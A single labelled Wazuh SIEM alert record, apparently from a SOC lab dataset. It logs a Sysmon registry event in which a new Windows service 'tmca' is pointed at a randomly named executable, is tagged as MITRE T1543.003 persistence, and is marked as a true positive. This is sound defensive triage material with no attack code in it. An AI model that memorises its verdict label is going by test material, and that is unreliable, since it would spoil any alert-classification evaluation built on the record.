{"id": "tl6e65cBARIQcDqlr2sh", "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\tmca\\\\ImagePath binary is: %%systemroot%%\\\\VInRVbCa.exe", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "tl6e65cBARIQcDqlr2sh", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "C:\\\\Windows\\\\system32\\\\services.exe", "targetObject": "HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\tmca\\\\ImagePath", "processGuid": "{6a97c67b-772a-686d-0b00-000000000e00}", "processId": "596", "utcTime": "2025-07-08 19:58:50.328", "details": "%%systemroot%%\\\\VInRVbCa.exe", "eventType": "SetValue", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "13", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-07-08 19:58:50.328\r\nProcessGuid: {6a97c67b-772a-686d-0b00-000000000e00}\r\nProcessId: 596\r\nImage: C:\\Windows\\system32\\services.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\tmca\\ImagePath\r\nDetails: %%systemroot%%\\VInRVbCa.exe\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-08T19:58:50.344113900Z", "eventRecordID": "25682", "threadID": "2668", "computer": "WinSrv2019.soclab.internal", "task": "13", "processID": "1164", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Evidence of new service creation found in registry under HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\tmca\\\\ImagePath binary is: %%systemroot%%\\\\VInRVbCa.exe", "groups": ["sysmon", "sysmon_eid13_detections", "windows"], "mitre": {"technique": ["Windows Service"], "id": ["T1543.003"], "tactic": ["Persistence", "Privilege Escalation"]}, "id": "92307"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1752004728.4939286", "timestamp": "2025-07-08T19:58:48.288+0000"}, "fields": {"timestamp": ["2025-07-08T19:58:48.288Z"]}, "sort": [1752004728288]}}
